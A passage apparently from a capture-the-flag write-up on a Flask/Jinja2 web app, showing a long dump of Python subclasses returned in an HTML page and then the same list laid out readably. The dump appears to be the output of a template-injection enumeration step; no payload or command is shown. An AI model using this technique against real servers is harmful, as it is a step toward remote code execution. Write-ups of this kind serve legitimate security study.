&#39;socketserver.ForkingMixIn&#39;&gt;, &lt;class &#39;socketserver.ThreadingMixIn&#39;&gt;, &lt;class &#39;socketserver.BaseRequestHandler&#39;&gt;, &lt;class &#39;logging.config.ConvertingMixin&#39;&gt;, &lt;class &#39;logging.config.BaseConfigurator&#39;&gt;, &lt;class &#39;gunicorn.glogging.Logger&#39;&gt;, &lt;class &#39;gunicorn.http.unreader.Unreader&#39;&gt;, &lt;class &#39;gunicorn.http.body.ChunkedReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.LengthReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.EOFReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.Body&#39;&gt;, &lt;class &#39;gunicorn.http.message.Message&#39;&gt;, &lt;class &#39;gunicorn.http.parser.Parser&#39;&gt;, &lt;class &#39;gunicorn.http.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;gunicorn.http.wsgi.Response&#39;&gt;, &lt;class &#39;gunicorn.workers.workertmp.WorkerTmp&#39;&gt;, &lt;class &#39;gunicorn.workers.base.Worker&#39;&gt;, &lt;class &#39;concurrent.futures._base._Waiter&#39;&gt;, &lt;class &#39;concurrent.futures._base._AcquireFutures&#39;&gt;, &lt;class &#39;concurrent.futures._base.Future&#39;&gt;, &lt;class &#39;concurrent.futures._base.Executor&#39;&gt;, &lt;class &#39;asyncio.coroutines.CoroWrapper&#39;&gt;, &lt;class &#39;asyncio.events.Handle&#39;&gt;, &lt;class &#39;asyncio.events.AbstractServer&#39;&gt;, &lt;class &#39;asyncio.events.AbstractEventLoop&#39;&gt;, &lt;class &#39;asyncio.events.AbstractEventLoopPolicy&#39;&gt;, &lt;class &#39;_asyncio.Future&#39;&gt;, &lt;class &#39;_asyncio.FutureIter&#39;&gt;, &lt;class &#39;TaskStepMethWrapper&#39;&gt;, &lt;class &#39;TaskWakeupMethWrapper&#39;&gt;, &lt;class &#39;_RunningLoopHolder&#39;&gt;, &lt;class &#39;asyncio.futures.Future&#39;&gt;, &lt;class &#39;asyncio.protocols.BaseProtocol&#39;&gt;, &lt;class &#39;asyncio.transports.BaseTransport&#39;&gt;, &lt;class &#39;asyncio.sslproto._SSLPipe&#39;&gt;, &lt;class &#39;asyncio.locks._ContextManager&#39;&gt;, &lt;class &#39;asyncio.locks._ContextManagerMixin&#39;&gt;, &lt;class &#39;asyncio.locks.Event&#39;&gt;, &lt;class &#39;asyncio.queues.Queue&#39;&gt;, &lt;class &#39;asyncio.streams.StreamWriter&#39;&gt;, &lt;class &#39;asyncio.streams.StreamReader&#39;&gt;, &lt;class &#39;asyncio.subprocess.Process&#39;&gt;, &lt;class &#39;asyncio.unix_events.AbstractChildWatcher&#39;&gt;, &lt;class &#39;gunicorn.selectors.BaseSelector&#39;&gt;, &lt;class &#39;gunicorn.workers.gthread.TConn&#39;&gt;, &lt;class &#39;concurrent.futures.thread._WorkItem&#39;&gt;, &lt;class &#39;_ast.AST&#39;&gt;, &lt;class &#39;_json.Scanner&#39;&gt;, &lt;class &#39;_json.Encoder&#39;&gt;, &lt;class &#39;json.decoder.JSONDecoder&#39;&gt;, &lt;class &#39;json.encoder.JSONEncoder&#39;&gt;, &lt;class &#39;jinja2.utils.MissingType&#39;&gt;, &lt;class &#39;jinja2.utils.LRUCache&#39;&gt;, &lt;class &#39;jinja2.utils.Cycler&#39;&gt;, &lt;class &#39;jinja2.utils.Joiner&#39;&gt;, &lt;class &#39;jinja2.utils.Namespace&#39;&gt;, &lt;class &#39;markupsafe._MarkupEscapeHelper&#39;&gt;, &lt;class &#39;jinja2.nodes.EvalContext&#39;&gt;, &lt;class &#39;jinja2.nodes.Node&#39;&gt;, &lt;class &#39;jinja2.runtime.TemplateReference&#39;&gt;, &lt;class &#39;jinja2.runtime.Context&#39;&gt;, &lt;class &#39;jinja2.runtime.BlockReference&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContextBase&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContextIterator&#39;&gt;, &lt;class &#39;jinja2.runtime.Macro&#39;&gt;, &lt;class &#39;jinja2.runtime.Undefined&#39;&gt;, &lt;class &#39;decimal.Decimal&#39;&gt;, &lt;class &#39;decimal.Context&#39;&gt;, &lt;class &#39;decimal.SignalDictMixin&#39;&gt;, &lt;class &#39;decimal.ContextManager&#39;&gt;, &lt;class &#39;numbers.Number&#39;&gt;, &lt;class &#39;jinja2.lexer.Failure&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStreamIterator&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStream&#39;&gt;, &lt;class &#39;jinja2.lexer.Lexer&#39;&gt;, &lt;class &#39;jinja2.parser.Parser&#39;&gt;, &lt;class &#39;jinja2.visitor.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.idtracking.Symbols&#39;&gt;, &lt;class &#39;jinja2.compiler.MacroRef&#39;&gt;, &lt;class &#39;jinja2.compiler.Frame&#39;&gt;, &lt;class &#39;jinja2.environment.Environment&#39;&gt;, &lt;class &#39;jinja2.environment.Template&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateModule&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateExpression&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateStream&#39;&gt;, &lt;class &#39;jinja2.loaders.BaseLoader&#39;&gt;, &lt;class &#39;jinja2.bccache.Bucket&#39;&gt;, &lt;class &#39;jinja2.bccache.BytecodeCache&#39;&gt;, &lt;class &#39;jinja2.asyncsupport.AsyncLoopContextIterator&#39;&gt;, &lt;class &#39;werkzeug._internal._Missing&#39;&gt;, &lt;class &#39;werkzeug._internal._DictAccessorProperty&#39;&gt;, &lt;class &#39;werkzeug.utils.HTMLBuilder&#39;&gt;, &lt;class &#39;werkzeug.exceptions.Aborter&#39;&gt;, &lt;class &#39;werkzeug.urls.Href&#39;&gt;, &lt;class &#39;email.message.Message&#39;&gt;, &lt;class &#39;http.client.HTTPConnection&#39;&gt;, &lt;class &#39;mimetypes.MimeTypes&#39;&gt;, &lt;class &#39;werkzeug.serving.WSGIRequestHandler&#39;&gt;, &lt;class &#39;werkzeug.serving._SSLContext&#39;&gt;, &lt;class &#39;werkzeug.serving.BaseWSGIServer&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableListMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.UpdateDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ViewItems&#39;&gt;, &lt;class &#39;werkzeug.datastructures._omd_bucket&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Headers&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableHeadersMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.IfRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Range&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ContentRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.FileStorage&#39;&gt;, &lt;class &#39;urllib.request.Request&#39;&gt;, &lt;class &#39;urllib.request.OpenerDirector&#39;&gt;, &lt;class &#39;urllib.request.BaseHandler&#39;&gt;, &lt;class &#39;urllib.request.HTTPPasswordMgr&#39;&gt;, &lt;class &#39;urllib.request.AbstractBasicAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.AbstractDigestAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.URLopener&#39;&gt;, &lt;class &#39;urllib.request.ftpwrapper&#39;&gt;, &lt;class &#39;werkzeug.wrappers.accept.AcceptMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.AuthorizationMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&#39;&gt;, &lt;class &#39;werkzeug.wsgi.ClosingIterator&#39;&gt;, &lt;class &#39;werkzeug.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;werkzeug.wsgi._RangeWrapper&#39;&gt;, &lt;class &#39;werkzeug.formparser.FormDataParser&#39;&gt;, &lt;class &#39;werkzeug.formparser.MultiPartParser&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_request.BaseRequest&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_response.BaseResponse&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagRequestMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagResponseMixin&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgentParser&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgent&#39;&gt;, &lt;class &#39;werkzeug.wrappers.user_agent.UserAgentMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.request.StreamOnlyMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStream&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStreamMixin&#39;&gt;, &lt;class &#39;http.cookiejar.Cookie&#39;&gt;, &lt;class &#39;http.cookiejar.CookiePolicy&#39;&gt;, &lt;class &#39;http.cookiejar.Absent&#39;&gt;, &lt;class &#39;http.cookiejar.CookieJar&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieHeaders&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieResponse&#39;&gt;, &lt;class &#39;werkzeug.test.EnvironBuilder&#39;&gt;, &lt;class &#39;werkzeug.test.Client&#39;&gt;, &lt;class &#39;uuid.UUID&#39;&gt;, &lt;class &#39;itsdangerous._json._CompactJSON&#39;&gt;, &lt;class &#39;hmac.HMAC&#39;&gt;, &lt;class &#39;itsdangerous.signer.SigningAlgorithm&#39;&gt;, &lt;class &#39;itsdangerous.signer.Signer&#39;&gt;, &lt;class &#39;itsdangerous.serializer.Serializer&#39;&gt;, &lt;class &#39;itsdangerous.url_safe.URLSafeSerializerMixin&#39;&gt;, &lt;class &#39;flask._compat._DeprecatedBool&#39;&gt;, &lt;class &#39;greenlet.greenlet&#39;&gt;, &lt;class &#39;werkzeug.local.Local&#39;&gt;, &lt;class &#39;werkzeug.local.LocalStack&#39;&gt;, &lt;class &#39;werkzeug.local.LocalManager&#39;&gt;, &lt;class &#39;werkzeug.local.LocalProxy&#39;&gt;, &lt;class &#39;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#39;&gt;, &lt;class &#39;dataclasses._MISSING_TYPE&#39;&gt;, &lt;class &#39;dataclasses._FIELD_BASE&#39;&gt;, &lt;class &#39;dataclasses.InitVar&#39;&gt;, &lt;class &#39;dataclasses.Field&#39;&gt;, &lt;class &#39;dataclasses._DataclassParams&#39;&gt;, &lt;class &#39;ast.NodeVisitor&#39;&gt;, &lt;class &#39;difflib.SequenceMatcher&#39;&gt;, &lt;class &#39;difflib.Differ&#39;&gt;, &lt;class &#39;difflib.HtmlDiff&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleFactory&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleTemplate&#39;&gt;, &lt;class &#39;werkzeug.routing.BaseConverter&#39;&gt;, &lt;class &#39;werkzeug.routing.Map&#39;&gt;, &lt;class &#39;werkzeug.routing.MapAdapter&#39;&gt;, &lt;class &#39;click._compat._FixupStream&#39;&gt;, &lt;class &#39;click._compat._AtomicFile&#39;&gt;, &lt;class &#39;click.utils.LazyFile&#39;&gt;, &lt;class &#39;click.utils.KeepOpenFile&#39;&gt;, &lt;class &#39;click.utils.PacifyFlushWrapper&#39;&gt;, &lt;class &#39;click.types.ParamType&#39;&gt;, &lt;class &#39;click.parser.Option&#39;&gt;, &lt;class &#39;click.parser.Argument&#39;&gt;, &lt;class &#39;click.parser.ParsingState&#39;&gt;, &lt;class &#39;click.parser.OptionParser&#39;&gt;, &lt;class &#39;click.formatting.HelpFormatter&#39;&gt;, &lt;class &#39;click.core.Context&#39;&gt;, &lt;class &#39;click.core.BaseCommand&#39;&gt;, &lt;class &#39;click.core.Parameter&#39;&gt;, &lt;class &#39;flask.signals.Namespace&#39;&gt;, &lt;class &#39;flask.signals._FakeSignal&#39;&gt;, &lt;class &#39;flask.helpers.locked_cached_property&#39;&gt;, &lt;class &#39;flask.helpers._PackageBoundObject&#39;&gt;, &lt;class &#39;flask.cli.DispatchingApp&#39;&gt;, &lt;class &#39;flask.cli.ScriptInfo&#39;&gt;, &lt;class &#39;flask.config.ConfigAttribute&#39;&gt;, &lt;class &#39;flask.ctx._AppCtxGlobals&#39;&gt;, &lt;class &#39;flask.ctx.AppContext&#39;&gt;, &lt;class &#39;flask.ctx.RequestContext&#39;&gt;, &lt;class &#39;flask.json.tag.JSONTag&#39;&gt;, &lt;class &#39;flask.json.tag.TaggedJSONSerializer&#39;&gt;, &lt;class &#39;flask.sessions.SessionInterface&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json._JSONModule&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json.JSONMixin&#39;&gt;, &lt;class &#39;flask.blueprints.BlueprintSetupState&#39;&gt;, &lt;class &#39;typing._Final&#39;&gt;, &lt;class &#39;typing._Immutable&#39;&gt;, &lt;class &#39;typing.Generic&#39;&gt;, &lt;class &#39;typing._TypingEmpty&#39;&gt;, &lt;class &#39;typing._TypingEllipsis&#39;&gt;, &lt;class &#39;typing.NamedTuple&#39;&gt;, &lt;class &#39;typing.io&#39;&gt;, &lt;class &#39;typing.re&#39;&gt;, &lt;class &#39;six._LazyDescr&#39;&gt;, &lt;class &#39;six._SixMetaPathImporter&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.AsymmetricSignatureContext&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.AsymmetricVerificationContext&#39;&gt;, &lt;class &#39;unicodedata.UCD&#39;&gt;, &lt;class &#39;asn1crypto.util.extended_date&#39;&gt;, &lt;class &#39;asn1crypto.util.extended_datetime&#39;&gt;, &lt;class &#39;CArgObject&#39;&gt;, &lt;class &#39;_ctypes.CThunkObject&#39;&gt;, &lt;class &#39;_ctypes._CData&#39;&gt;, &lt;class &#39;_ctypes.CField&#39;&gt;, &lt;class &#39;_ctypes.DictRemover&#39;&gt;, &lt;class &#39;ctypes.CDLL&#39;&gt;, &lt;class &#39;ctypes.LibraryLoader&#39;&gt;, &lt;class &#39;asn1crypto.core.Asn1Value&#39;&gt;, &lt;class &#39;asn1crypto.core.ValueMap&#39;&gt;, &lt;class &#39;asn1crypto.core.Castable&#39;&gt;, &lt;class &#39;asn1crypto.core.Constructable&#39;&gt;, &lt;class &#39;asn1crypto.core.Concat&#39;&gt;, &lt;class &#39;asn1crypto.core.BitString&#39;&gt;, &lt;class &#39;asn1crypto.algos._ForceNullParameters&#39;&gt;, &lt;class &#39;cryptography.utils._DeprecatedValue&#39;&gt;, &lt;class &#39;cryptography.utils._ModuleWithDeprecations&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.CipherBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.HashBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.HMACBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.CMACBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.PBKDF2HMACBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.RSABackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.DSABackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.EllipticCurveBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.PEMSerializationBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.DERSerializationBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.X509Backend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.DHBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.ScryptBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.HashAlgorithm&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.HashContext&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.ExtendableOutputFunction&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.Hash&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA512_224&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA512_256&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA224&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA256&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA384&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA512&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA3_224&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA3_256&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA3_384&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA3_512&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHAKE128&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHAKE256&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.MD5&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.BLAKE2b&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.BLAKE2s&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.utils.Prehashed&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.serialization.base.KeySerializationEncryption&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.serialization.base.BestAvailableEncryption&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.serialization.base.NoEncryption&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAParameters&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAPrivateKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAPublicKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAParameterNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAPublicNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAPrivateNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat._oid.ObjectIdentifier&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurveOID&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurve&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurveSignatureAlgorithm&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePrivateKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePublicKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT571R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT409R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT283R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT233R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT163R2&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT571K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT409K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT283K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT233K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT163K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP521R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP384R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP256R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP256K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP224R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP192R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP256R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP384R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP512R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.ECDSA&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePublicNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePrivateNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.ECDH&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ed25519.Ed25519PublicKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ed25519.Ed25519PrivateKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.padding.AsymmetricPadding&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.padding.PKCS1v15&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.padding.PSS&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.padding.OAEP&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.padding.MGF1&#39;&gt;, &lt;class &#39;jwt.algorithms.Algorithm&#39;&gt;, &lt;class &#39;jwt.api_jws.PyJWS&#39;&gt;, &lt;class &#39;jinja2.ext.Extension&#39;&gt;, &lt;class &#39;jinja2.ext._CommentFinder&#39;&gt;, &lt;class &#39;jinja2.debug.TracebackFrameProxy&#39;&gt;, &lt;class &#39;jinja2.debug.ProcessedTraceback&#39;&gt;]</span></h1>
	</div>
</body>

<script src="/static/js/snow.js"></script>
```

Here the list of classes in a more readable way.

```python
[<class 'type'>, 
<class 'weakref'>, 
<class 'weakcallableproxy'>, 
<class 'weakproxy'>, 
<class 'int'>, 
<class 'bytearray'>, 
<class 'bytes'>, 
<class 'list'>, 
<class 'NoneType'>, 
<class 'NotImplementedType'>, 
<class 'traceback'>, 
<class 'super'>, 
<class 'range'>, 
<class 'dict'>, 
<class 'dict_keys'>, 
<class 'dict_values'>, 
<class 'dict_items'>, 
<class 'odict_iterator'>, 
<class 'set'>, 
<class 'str'>, 
<class 'slice'>, 
<class 'staticmethod'>, 
<class 'complex'>, 
<class 'float'>, 
<class 'frozenset'>, 
<class 'property'>, 
<class 'managedbuffer'>, 
<class 'memoryview'>, 
<class 'tuple'>, 
<class 'enumerate'>, 
<class 'reversed'>, 
<class 'stderrprinter'>, 
<class 'code'>, 
<class 'frame'>, 
<class 'builtin_function_or_method'>, 
<class 'method'>, 
<class 'function'>, 
<class 'mappingproxy'>, 
<class 'generator'>, 
<class 'getset_descriptor'>, 
<class 'wrapper_descriptor'>, 
<class 'method-wrapper'>, 
<class 'ellipsis'>, 
<class 'member_descriptor'>, 
<class 'types.SimpleNamespace'>, 
<class 'PyCapsule'>, 
<class 'longrange_iterator'>, 
<class 'cell'>, 
<class 'instancemethod'>, 
<class 'classmethod_descriptor'>, 
<class 'method_descriptor'>, 
<class 'callable_iterator'>, 
<class 'iterator'>, 
<class 'coroutine'>, 
<class 'coroutine_wrapper'>, 
<class 'moduledef'>, 
<class 'module'>, 
<class 'EncodingMap'>, 
<class 'fieldnameiterator'>, 
<class 'formatteriterator'>, 
<class 'filter'>, 
<class 'map'>, 
<class 'zip'>, 
<class 'BaseException'>, 
<class 'hamt'>, 
<class 'hamt_array_node'>, 
<class 'hamt_bitmap_node'>, 
<class 'hamt_collision_node'>, 
<class 'keys'>, 
<class 'values'>, 
<class 'items'>, 
<class 'Context'>, 
<class 'ContextVar'>, 
<class 'Token'>, 
<class 'Token.MISSING'>, 
<class '_frozen_importlib._ModuleLock'>, 
<class '_frozen_importlib._DummyModuleLock'>, 
<class '_frozen_importlib._ModuleLockManager'>, 
<class '_frozen_importlib._installed_safely'>, 
<class '_frozen_importlib.ModuleSpec'>, 
<class '_frozen_importlib.BuiltinImporter'>, 
<class 'classmethod'>, 
<class '_frozen_importlib.FrozenImporter'>, 
<class '_frozen_importlib._ImportLockContext'>, 
<class '_thread._localdummy'>, 
<class '_thread._local'>, 
<class '_thread.lock'>, 
<class '_thread.RLock'>, 
<class 'zipimport.zipimporter'>, 
<class '_frozen_importlib_external.WindowsRegistryFinder'>, 
<class '_frozen_importlib_external._LoaderBasics'>, 
<class '_frozen_importlib_external.FileLoader'>, 
<class '_frozen_importlib_external._NamespacePath'>, 
<class '_frozen_importlib_external._NamespaceLoader'>, 
<class '_frozen_importlib_external.PathFinder'>, 
<class '_frozen_importlib_external.FileFinder'>, 
<class '_io._IOBase'>, 
<class '_io._BytesIOBuffer'>, 
<class '_io.IncrementalNewlineDecoder'>, 
<class 'posix.ScandirIterator'>, 
<class 'posix.DirEntry'>, 
<class 'codecs.Codec'>, 
<class 'codecs.IncrementalEncoder'>, 
<class 'codecs.IncrementalDecoder'>, 
<class 'codecs.StreamReaderWriter'>, 
<class 'codecs.StreamRecoder'>, 
<class '_abc_data'>, 
<class 'abc.ABC'>, 
<class 'dict_itemiterator'>, 
<class 'collections.abc.Hashable'>, 
<class 'collections.abc.Awaitable'>, 
<class 'collections.abc.AsyncIterable'>, 
<class 'async_generator'>, 
<class 'collections.abc.Iterable'>, 
<class 'bytes_iterator'>, 
<class 'bytearray_iterator'>, 
<class 'dict_keyiterator'>, 
<class 'dict_valueiterator'>, 
<class 'list_iterator'>, 
<class 'list_reverseiterator'>, 
<class 'range_iterator'>, 
<class 'set_iterator'>, 
<class 'str_iterator'>, 
<class 'tuple_iterator'>, 
<class 'collections.abc.Sized'>, 
<class 'collections.abc.Container'>, 
<class 'collections.abc.Callable'>, 
<class 'os._wrap_close'>, 
<class '_sitebuiltins.Quitter'>, 
<class '_sitebuiltins._Printer'>, 
<class '_sitebuiltins._Helper'>, 
<class 'types.DynamicClassAttribute'>, 
<class 'types._GeneratorWrapper'>, 
<class 'collections.deque'>, 
<class '_collections._deque_iterator'>, 
<class '_collections._deque_reverse_iterator'>, 
<class 'enum.auto'>, 
<enum 'Enum'>, 
<class 're.Pattern'>, 
<class 're.Match'>, 
<class '_sre.SRE_Scanner'>, 
<class 'sre_parse.Pattern'>, 
<class 'sre_parse.SubPattern'>, 
<class 'sre_parse.Tokenizer'>, 
<class 'functools.partial'>, 
<class 'functools._lru_cache_wrapper'>, 
<class 'operator.itemgetter'>, 
<class 'operator.attrgetter'>, 
<class 'operator.methodcaller'>, 
<class 'itertools.accumulate'>, 
<class 'itertools.combinations'>, 
<class 'itertools.combinations_with_replacement'>, 
<class 'itertools.cycle'>, 
<class 'itertools.dropwhile'>, 
<class 'itertools.takewhile'>, 
<class 'itertools.islice'>, 
<class 'itertools.starmap'>, 
<class 'itertools.chain'>, 
<class 'itertools.compress'>, 
<class 'itertools.filterfalse'>, 
<class 'itertools.count'>, 
<class 'itertools.zip_longest'>, 
<class 'itertools.permutations'>, 
<class 'itertools.product'>, 
<class 'itertools.repeat'>, 
<class 'itertools.groupby'>, 
<class 'itertools._grouper'>, 
<class 'itertools._tee'>, 
<class 'itertools._tee_dataobject'>, 
<class 'reprlib.Repr'>, 
<class 'collections._Link'>, 
<class 'functools.partialmethod'>, 
<class 're.Scanner'>, 
<class '__future__._Feature'>, 
<class 'warnings.WarningMessage'>, 
<class 'warnings.catch_warnings'>, 
<class 'importlib.abc.Finder'>, 
<class 'importlib.abc.Loader'>, 
<class 'importlib.abc.ResourceReader'>, 
<class 'contextlib.ContextDecorator'>, 
<class 'contextlib._GeneratorContextManagerBase'>, 
<class 'contextlib._BaseExitStack'>, 
<class 'zlib.Compress'>, 
<class 'zlib.Decompress'>, 
<class 'tokenize.Untokenizer'>, 
<class 'traceback.FrameSummary'>, 
<class 'traceback.TracebackException'>, 
<class '_weakrefset._IterationGuard'>, 
<class '_weakrefset.WeakSet'>, 
<class 'threading._RLock'>, 
<class 'threading.Condition'>, 
<class 'threading.Semaphore'>, 
<class 'threading.Event'>, 
<class 'threading.Barrier'>, 
<class 'threading.Thread'>, 
<class '_bz2.BZ2Compressor'>, 
<class '_bz2.BZ2Decompressor'>, 
<class '_lzma.LZMACompressor'>, 
<class '_lzma.LZMADecompressor'>, 
<class 'Struct'>, 
<class 'unpack_iterator'>, 
<class 'zipfile.ZipInfo'>, 
